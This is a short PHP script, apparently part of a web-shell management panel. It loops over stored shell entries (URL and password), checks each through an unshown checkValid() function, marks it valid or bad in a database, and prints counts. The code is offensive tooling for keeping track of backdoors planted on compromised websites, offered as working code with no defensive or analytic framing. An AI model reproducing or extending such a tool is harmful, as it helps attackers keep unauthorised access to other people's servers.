<?php
include('init.php');

if(isset($_POST['id'])){
$massive=explode(',',$_POST['id']);
if($massive[0]===""){
exit('Please select a shells and try again!');
}
$well=array();
$bad=array();
		foreach($massive as $id) {
		if($id=='on')continue;
			
			$url = $database[$id]['url'];
			$pass = $database[$id]['pass'];
			
			
			if(checkValid($url,$pass)){
			   $well[]=$id;			   
		       $database[$id]['valid'] = '<font color="green">YES</font>';	
               save_db();			   
			   }
			else{
			   $bad[]=$id;
			   $database[$id]['valid'] = '<font color="red">NO</font>';
			   save_db();
			   }

		
		}
		 
		 }



$total=count($well) + count($bad);
echo '<b>Total:</b>'.$total.'&nbsp&nbsp<b>Valid:</b>'.count($well).'&nbsp&nbsp<b>Bad:</b>'.count($bad).'&nbsp&nbsp<a href="">Reload Page</a>';







?>